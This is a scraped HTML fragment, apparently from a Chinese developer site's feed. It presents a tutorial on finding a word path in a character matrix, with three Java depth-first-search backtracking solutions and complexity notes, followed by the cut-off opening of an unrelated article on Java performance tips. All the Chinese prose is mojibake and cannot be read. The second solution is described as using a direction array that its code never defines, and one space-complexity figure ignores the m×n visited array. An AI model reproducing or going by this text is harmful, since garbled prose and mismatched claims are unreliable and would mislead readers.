<p>è¯·è®¾è®¡â¼€ä¸ªå‡½æ•°ï¼Œâ½¤æ¥åˆ¤æ–­åœ¨â¼€ä¸ªçŸ©é˜µä¸­æ˜¯å¦å­˜åœ¨â¼€æ¡åŒ…å«æŸå­—ç¬¦ä¸²æ‰€æœ‰å­—ç¬¦çš„è·¯å¾„ã€‚è·¯å¾„å¯ä»¥ä»çŸ©é˜µä¸­çš„ä»»æ„â¼€ä¸ªæ ¼â¼¦å¼€å§‹ï¼Œæ¯â¼€æ­¥å¯ä»¥åœ¨çŸ©é˜µä¸­å‘å·¦ï¼Œå‘å³ï¼Œå‘ä¸Šï¼Œå‘ä¸‹ç§»åŠ¨â¼€ä¸ªæ ¼â¼¦ã€‚å¦‚æœâ¼€æ¡è·¯å¾„ç»è¿‡äº†çŸ©é˜µä¸­çš„æŸâ¼€ä¸ªæ ¼â¼¦ï¼Œåˆ™è¯¥è·¯å¾„ä¸èƒ½å†è¿›â¼Šè¯¥æ ¼â¼¦ã€‚ ä¾‹å¦‚çŸ©é˜µï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7cad8021c9eb4b839b1074b0d1395249~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2V2ZW5Db2Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769472997&amp;x-signature=jnxT2roLKGns4rcGon1m7fpuFWA%3D" alt="" loading="lazy"/></p>
<p>ä¸­åŒ…å«â¼€æ¡å­—ç¬¦ä¸² " bcced " çš„è·¯å¾„ï¼Œä½†æ˜¯çŸ©é˜µä¸­ä¸åŒ…å« " abcb " è·¯å¾„ï¼Œå› ä¸ºå­—ç¬¦ä¸²çš„ç¬¬â¼€ä¸ªå­—ç¬¦ bå æ®äº†çŸ©é˜µä¸­çš„ç¬¬â¼€â¾ç¬¬â¼†ä¸ªæ ¼â¼¦ä¹‹åï¼Œè·¯å¾„ä¸èƒ½å†æ¬¡è¿›â¼Šè¯¥æ ¼â¼¦ã€‚</p>
<p>ç¤ºä¾‹1</p>
<p>è¾“â¼Šï¼š<code>[[a,b,c,e],[s,f,c,s],[a,d,e,e]],"abcced"</code>
è¿”å›å€¼ï¼š<code>true</code></p>
<h2 data-id="heading-1">æ€è·¯åŠè§£ç­”</h2>
<h3 data-id="heading-2">DFSå›æº¯</h3>
<p>ä¸»è¦çš„æ€è·¯æ˜¯å¯¹äºæ¯â¼€ä¸ªå­—ç¬¦ä¸ºèµ·ç‚¹ï¼Œé€’å½’å‘å››å‘¨æ‹“å±•ï¼Œç„¶åé‡åˆ°ä¸åŒ¹é…è¿”å› false ï¼ŒåŒ¹é…åˆ™æ¥ç€åŒ¹é…ç›´åˆ°å®Œæˆï¼Œâ¾¥â¾¯åŒ…å«äº† å›æº¯ çš„æ€æƒ³ã€‚æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<p>é’ˆå¯¹æ¯â¼€ä¸ªå­—ç¬¦ä¸ºèµ·ç‚¹ï¼Œåˆå§‹åŒ–â¼€ä¸ªå’ŒçŸ©é˜µâ¼€æ ·â¼¤â¼©çš„æ ‡è¯†æ•°ç»„ï¼Œæ ‡è¯†è¯¥ä½ç½®æ˜¯å¦è¢«è®¿é—®è¿‡ï¼Œâ¼€å¼€å§‹é»˜è®¤æ˜¯false ã€‚</p>
<ol>
<li>å¦‚æœå½“å‰çš„å­—ç¬¦ç´¢å¼•å·²ç»è¶…è¿‡äº†å­—ç¬¦ä¸²â»“åº¦ï¼Œè¯´æ˜å‰â¾¯å·²ç»å®Œå…¨åŒ¹é…æˆåŠŸï¼Œç›´æ¥è¿”å› true</li>
<li>å¦‚æœâ¾ç´¢å¼•å’Œåˆ—ç´¢å¼•ï¼Œä¸åœ¨æœ‰æ•ˆçš„èŒƒå›´å†…ï¼Œæˆ–è€…æ”¹ä½ç½®å·²ç»æ ‡è¯†è¢«è®¿é—®ï¼Œç›´æ¥è¿”å› false</li>
<li>å¦åˆ™å°†å½“å‰æ ‡è¯†ç½®ä¸ºå·²ç»è®¿é—®è¿‡</li>
<li>å¦‚æœçŸ©é˜µå½“å‰ä½ç½®çš„å­—ç¬¦å’Œå­—ç¬¦ä¸²ç›¸ç­‰ï¼Œé‚£ä¹ˆå°±å­—ç¬¦ä¸²çš„ç´¢å¼•åŠ â¼€ï¼Œé€’å½’åˆ¤æ–­å‘¨è¾¹çš„å››ä¸ªï¼Œåªè¦â¼€ä¸ªçš„ç»“æœä¸º true ï¼Œå°±è¿”å› true ï¼Œå¦åˆ™å°†è¯¥ä½ç½®ç½®ä¸ºæ²¡æœ‰è®¿é—®è¿‡ï¼ˆç›¸å½“äºå›æº¯ï¼Œé€€å›ä¸Šâ¼€æ­¥ï¼‰ï¼Œè¿”å› false ã€‚çŸ©é˜µå½“å‰ä½ç½®çš„å­—ç¬¦å’Œå­—ç¬¦ä¸²ä¸ç›¸ç­‰ï¼Œå¦åˆ™åŒæ ·ä¹Ÿæ˜¯å°†è¯¥ä½ç½®ç½®ä¸ºæ²¡æœ‰è®¿é—®è¿‡ï¼ˆç›¸å½“äºå›æº¯ï¼Œé€€å›ä¸Šâ¼€æ­¥ï¼‰ï¼Œè¿”å› false ã€‚</li>
</ol>
<p>â½å¦‚æŸ¥æ‰¾ bcced :</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc55e3729dee4b55b52e73401da65eec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2V2ZW5Db2Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769472997&amp;x-signature=FfKIpLj2oiPcBqWuPONgEDh6u9g%3D" alt="" loading="lazy"/></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasPath</span><span class="hljs-params">(<span class="hljs-type">char</span>[][] matrix, String word)</span> {
        <span class="hljs-comment">// write code here</span>
        <span class="hljs-keyword">if</span> (matrix == <span class="hljs-literal">null</span> || word == <span class="hljs-literal">null</span> || word.length() == <span class="hljs-number">0</span>) {
        	<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; matrix.length; i++) {
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; matrix[<span class="hljs-number">0</span>].length; j++) {
                <span class="hljs-type">boolean</span>[][] flags = <span class="hljs-keyword">new</span> <span class="hljs-title class_">boolean</span>[matrix.length][matrix[<span class="hljs-number">0</span>].length];
                
                <span class="hljs-type">boolean</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> judge(i, j, matrix, flags, word, <span class="hljs-number">0</span>);
                <span class="hljs-keyword">if</span> (result) {
                	<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
                }
            }
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
   }
    
   <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">judge</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j, <span class="hljs-type">char</span>[][] matrix, <span class="hljs-type">boolean</span>[][] flags, String words, <span class="hljs-type">int</span> index)</span> {
        <span class="hljs-keyword">if</span> (index &gt;= words.length()) {
        	<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
       
        <span class="hljs-keyword">if</span> (i &lt; <span class="hljs-number">0</span> || j &lt; <span class="hljs-number">0</span> || i &gt;= matrix.length || j &gt;= matrix[<span class="hljs-number">0</span>].length || flags[i][j]) {
        	<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        flags[i][j] = <span class="hljs-literal">true</span>;
        
        <span class="hljs-keyword">if</span> (matrix[i][j] == words.charAt(index)) {
            <span class="hljs-keyword">if</span> (judge(i - <span class="hljs-number">1</span>, j, matrix, flags, words, index + <span class="hljs-number">1</span>)
            || judge(i + <span class="hljs-number">1</span>, j, matrix, flags, words, index + <span class="hljs-number">1</span>)
            || judge(i, j + <span class="hljs-number">1</span>, matrix, flags, words, index + <span class="hljs-number">1</span>)
            || judge(i, j - <span class="hljs-number">1</span>, matrix, flags, words, index + <span class="hljs-number">1</span>)) {
            	<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            } <span class="hljs-keyword">else</span> {
                flags[i][j] = <span class="hljs-literal">false</span>;
                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        	}
        } <span class="hljs-keyword">else</span> {
            flags[i][j] = <span class="hljs-literal">false</span>;
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
    }
}
</code></pre>
<ul>
<li><strong>æ—¶é—´å¤æ‚åº¦</strong>ï¼šO(3^k Ã— m Ã— n)ï¼Œå…¶ä¸­kä¸ºå•è¯é•¿åº¦ï¼Œmã€nä¸ºçŸ©é˜µå°ºå¯¸ã€‚æ¯ä¸ªç‚¹æœ‰3ä¸ªæ–¹å‘å¯é€‰ï¼ˆä¸èƒ½å›é€€ï¼‰</li>
<li><strong>ç©ºé—´å¤æ‚åº¦</strong>ï¼šO(k)ï¼Œé€’å½’æ ˆæ·±åº¦å’Œvisitedæ•°ç»„ç©ºé—´</li>
</ul>
<h3 data-id="heading-3">æ–¹å‘æ•°ç»„ä¼˜åŒ–</h3>
<p>ä½¿ç”¨é¢å¤–çš„è®¿é—®æ ‡è®°æ•°ç»„æ¥è®°å½•è·¯å¾„çŠ¶æ€ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">exist</span><span class="hljs-params">(<span class="hljs-type">char</span>[][] board, String word)</span> {
        <span class="hljs-keyword">if</span> (board == <span class="hljs-literal">null</span> || board.length == <span class="hljs-number">0</span> || board[<span class="hljs-number">0</span>].length == <span class="hljs-number">0</span> || word == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        
        <span class="hljs-type">int</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> board.length, n = board[<span class="hljs-number">0</span>].length;
        <span class="hljs-type">boolean</span>[][] visited = <span class="hljs-keyword">new</span> <span class="hljs-title class_">boolean</span>[m][n];
        <span class="hljs-type">char</span>[] words = word.toCharArray();
        
        <span class="hljs-comment">// éå†çŸ©é˜µä¸­çš„æ¯ä¸ªå•å…ƒæ ¼ä½œä¸ºèµ·å§‹ç‚¹</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; m; i++) {
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; n; j++) {
                <span class="hljs-keyword">if</span> (dfs(board, visited, words, i, j, <span class="hljs-number">0</span>)) {
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
                }
            }
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">dfs</span><span class="hljs-params">(<span class="hljs-type">char</span>[][] board, <span class="hljs-type">boolean</span>[][] visited, <span class="hljs-type">char</span>[] word, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j, <span class="hljs-type">int</span> index)</span> {
        <span class="hljs-comment">// ç»ˆæ­¢æ¡ä»¶1ï¼šæ‰¾åˆ°å®Œæ•´è·¯å¾„</span>
        <span class="hljs-keyword">if</span> (index == word.length) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
        
        <span class="hljs-comment">// ç»ˆæ­¢æ¡ä»¶2ï¼šè¶Šç•Œæˆ–å·²è®¿é—®æˆ–å­—ç¬¦ä¸åŒ¹é…</span>
        <span class="hljs-keyword">if</span> (i &lt; <span class="hljs-number">0</span> || i &gt;= board.length || j &lt; <span class="hljs-number">0</span> || j &gt;= board[<span class="hljs-number">0</span>].length || 
            visited[i][j] || board[i][j] != word[index]) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        
        <span class="hljs-comment">// æ ‡è®°å½“å‰å•å…ƒæ ¼ä¸ºå·²è®¿é—®</span>
        visited[i][j] = <span class="hljs-literal">true</span>;
        
        <span class="hljs-comment">// å‘å››ä¸ªæ–¹å‘è¿›è¡ŒDFSæœç´¢</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">found</span> <span class="hljs-operator">=</span> dfs(board, visited, word, i + <span class="hljs-number">1</span>, j, index + <span class="hljs-number">1</span>) ||  <span class="hljs-comment">// å‘ä¸‹</span>
                       dfs(board, visited, word, i - <span class="hljs-number">1</span>, j, index + <span class="hljs-number">1</span>) ||  <span class="hljs-comment">// å‘ä¸Š</span>
                       dfs(board, visited, word, i, j + <span class="hljs-number">1</span>, index + <span class="hljs-number">1</span>) ||  <span class="hljs-comment">// å‘å³</span>
                       dfs(board, visited, word, i, j - <span class="hljs-number">1</span>, index + <span class="hljs-number">1</span>);    <span class="hljs-comment">// å‘å·¦</span>
        
        <span class="hljs-comment">// å›æº¯ï¼šæ¢å¤è®¿é—®çŠ¶æ€</span>
        visited[i][j] = <span class="hljs-literal">false</span>;
        
        <span class="hljs-keyword">return</span> found;
    }
}
</code></pre>
<ul>
<li><strong>æ—¶é—´å¤æ‚åº¦</strong>ï¼šO(3^k Ã— m Ã— n)ï¼Œå…¶ä¸­kä¸ºå•è¯é•¿åº¦ï¼Œmã€nä¸ºçŸ©é˜µå°ºå¯¸ã€‚æ¯ä¸ªç‚¹æœ‰3ä¸ªæ–¹å‘å¯é€‰ï¼ˆä¸èƒ½å›é€€ï¼‰</li>
<li><strong>ç©ºé—´å¤æ‚åº¦</strong>ï¼šO(k)ï¼Œé€’å½’æ ˆæ·±åº¦å’Œvisitedæ•°ç»„ç©ºé—´</li>
</ul>
<p>æ—¶é—´ç©ºé—´å¤æ‚åº¦ä¸æ–¹æ³•ä¸€ç›¸åŒï¼Œä½†ä»£ç æ›´æ˜“æ‰©å±•ï¼ˆå¦‚éœ€è¦å…«æ–¹å‘ç§»åŠ¨æ—¶åªéœ€ä¿®æ”¹DIRECTIONSæ•°ç»„ï¼‰</p>
<h3 data-id="heading-4">åŸåœ°æ ‡è®°ä¼˜åŒ–ï¼ˆæœ€ä¼˜ï¼‰</h3>
<p>é€šè¿‡ä¿®æ”¹åŸçŸ©é˜µæ¥æ ‡è®°è®¿é—®çŠ¶æ€ï¼ŒèŠ‚çœç©ºé—´ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">exist</span><span class="hljs-params">(<span class="hljs-type">char</span>[][] board, String word)</span> {
        <span class="hljs-keyword">if</span> (board == <span class="hljs-literal">null</span> || board.length == <span class="hljs-number">0</span> || word == <span class="hljs-literal">null</span> || word.length() == <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        
        <span class="hljs-type">char</span>[] words = word.toCharArray();
        
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; board.length; i++) {
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; board[<span class="hljs-number">0</span>].length; j++) {
                <span class="hljs-keyword">if</span> (dfsOptimized(board, words, i, j, <span class="hljs-number">0</span>)) {
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
                }
            }
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">dfsOptimized</span><span class="hljs-params">(<span class="hljs-type">char</span>[][] board, <span class="hljs-type">char</span>[] word, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j, <span class="hljs-type">int</span> index)</span> {
        <span class="hljs-comment">// è¾¹ç•Œæ£€æŸ¥å’Œå­—ç¬¦åŒ¹é…æ£€æŸ¥</span>
        <span class="hljs-keyword">if</span> (i &lt; <span class="hljs-number">0</span> || i &gt;= board.length || j &lt; <span class="hljs-number">0</span> || j &gt;= board[<span class="hljs-number">0</span>].length || 
            board[i][j] != word[index]) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        
        <span class="hljs-comment">// æ‰¾åˆ°å®Œæ•´è·¯å¾„</span>
        <span class="hljs-keyword">if</span> (index == word.length - <span class="hljs-number">1</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
        
        <span class="hljs-comment">// åŸåœ°æ ‡è®°ï¼šå°†å½“å‰å­—ç¬¦ä¸´æ—¶æ›¿æ¢ä¸ºç‰¹æ®Šæ ‡è®°ï¼ˆä¸èƒ½å‡ºç°çš„å­—ç¬¦ï¼‰</span>
        <span class="hljs-type">char</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> board[i][j];
        board[i][j] = <span class="hljs-string">'#'</span>;  <span class="hljs-comment">// æ ‡è®°ä¸ºå·²è®¿é—®</span>
        
        <span class="hljs-comment">// å››ä¸ªæ–¹å‘æœç´¢</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> dfsOptimized(board, word, i + <span class="hljs-number">1</span>, j, index + <span class="hljs-number">1</span>) ||
                     dfsOptimized(board, word, i - <span class="hljs-number">1</span>, j, index + <span class="hljs-number">1</span>) ||
                     dfsOptimized(board, word, i, j + <span class="hljs-number">1</span>, index + <span class="hljs-number">1</span>) ||
                     dfsOptimized(board, word, i, j - <span class="hljs-number">1</span>, index + <span class="hljs-number">1</span>);
        
        <span class="hljs-comment">// å›æº¯ï¼šæ¢å¤åŸå§‹å­—ç¬¦</span>
        board[i][j] = temp;
        
        <span class="hljs-keyword">return</span> res;
    }
}
</code></pre>
<p><strong>å…³é”®æŠ€å·§ï¼š</strong></p>
<ol>
<li><strong>ä¸´æ—¶ä¿®æ”¹</strong>ï¼šå°†è®¿é—®è¿‡çš„<code>board[i][j]</code>æ”¹ä¸º<code>'#'</code>ï¼ˆæˆ–å…¶ä»–ä¸åœ¨å­—æ¯è¡¨ä¸­çš„å­—ç¬¦ï¼‰</li>
<li><strong>è‡ªåŠ¨é¿éšœ</strong>ï¼šåç»­æœç´¢é‡åˆ°<code>'#'</code>ä¼šå› å­—ç¬¦ä¸åŒ¹é…è€Œè‡ªåŠ¨è·³è¿‡</li>
<li><strong>çŠ¶æ€æ¢å¤</strong>ï¼šå›æº¯æ—¶æ¢å¤åŸå§‹å­—ç¬¦ï¼Œç¡®ä¿ä¸å½±å“å…¶ä»–è·¯å¾„æœç´¢</li>
</ol>
<p><strong>ç®—æ³•åˆ†æï¼š</strong></p>
<ul>
<li><strong>æ—¶é—´å¤æ‚åº¦</strong>ï¼šO(3^k Ã— m Ã— n)ï¼Œä¸å‰è¿°æ–¹æ³•ç›¸åŒ</li>
<li><strong>ç©ºé—´å¤æ‚åº¦</strong>ï¼šO(1)ï¼Œ<strong>æ˜¾è‘—ä¼˜åŒ–</strong>ï¼ä»…ä½¿ç”¨å¸¸æ•°ç©ºé—´ï¼ˆé€’å½’æ ˆç©ºé—´ä¸å¯é¿å…ï¼‰</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Javaæ€§èƒ½æå‡50%çš„5ä¸ªéšè—æŠ€å·§ï¼Œ90%å¼€å‘è€…éƒ½ä¸çŸ¥é“ï¼]]></title>    <link>https://juejin.cn/post/7596962344044544040</link>    <guid>https://juejin.cn/post/7596962344044544040</guid>    <pubDate>2026-01-20T00:18:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596962344044544040" data-draft-id="7596943803933671464" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Javaæ€§èƒ½æå‡50%çš„5ä¸ªéšè—æŠ€å·§ï¼Œ90%å¼€å‘è€…éƒ½ä¸çŸ¥é“ï¼"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-20T00:18:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿æ©™çš„ç™¾å®ç®±"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Javaæ€§èƒ½æå‡50%çš„5ä¸ªéšè—æŠ€å·§ï¼Œ90%å¼€å‘è€…éƒ½ä¸çŸ¥é“ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿æ©™çš„ç™¾å®ç®±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T00:18:37.000Z" title="Tue Jan 20 2026 00:18:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>Javaæ€§èƒ½æå‡50%çš„5ä¸ªéšè—æŠ€å·§ï¼Œ90%å¼€å‘è€…éƒ½ä¸çŸ¥é“ï¼</strong></h2>
<h2 data-id="heading-1">å¼•è¨€</h2>
<p>Javaä½œä¸ºä¸€é—¨æˆç†Ÿä¸”å¹¿æ³›ä½¿ç”¨çš„ç¼–ç¨‹è¯­è¨€ï¼Œå…¶æ€§èƒ½ä¼˜åŒ–ä¸€ç›´æ˜¯å¼€å‘è€…å…³æ³¨çš„ç„¦ç‚¹ã€‚è™½ç„¶JVMçš„å³æ—¶ç¼–è¯‘å™¨ï¼ˆJITï¼‰å’Œåƒåœ¾å›æ”¶å™¨ï¼ˆGCï¼‰å·²ç»åšäº†å¤§é‡ä¼˜åŒ–å·¥ä½œï¼Œä½†ä»æœ‰ä¸å°‘éšè—çš„æŠ€å·§å¯ä»¥å¸®åŠ©æˆ‘ä»¬è¿›ä¸€æ­¥æå‡æ€§èƒ½ã€‚æœ¬æ–‡å°†æ­ç¤º5ä¸ªé²œä¸ºäººçŸ¥ä½†æ•ˆæœæ˜¾è‘—çš„Javaæ€§èƒ½ä¼˜åŒ–æŠ€å·§ï¼Œè¿™äº›æŠ€å·§åœ¨å®é™…å¼€å‘ä¸­å¾€å¾€è¢«å¿½è§†ï¼Œå´èƒ½å¸¦æ¥é«˜è¾¾50%çš„æ€§èƒ½æå‡ï¼</p>
<h2 data-id="heading-2">ä¸»ä½“</h2>
<h3 data-id="heading-3">1. ä½¿ç”¨<code>Arrays.fill()</code>æ›¿ä»£å¾ªç¯åˆå§‹åŒ–æ•°ç»„</h3>
<p><strong>é—®é¢˜åœºæ™¯</strong>ï¼š<br/>
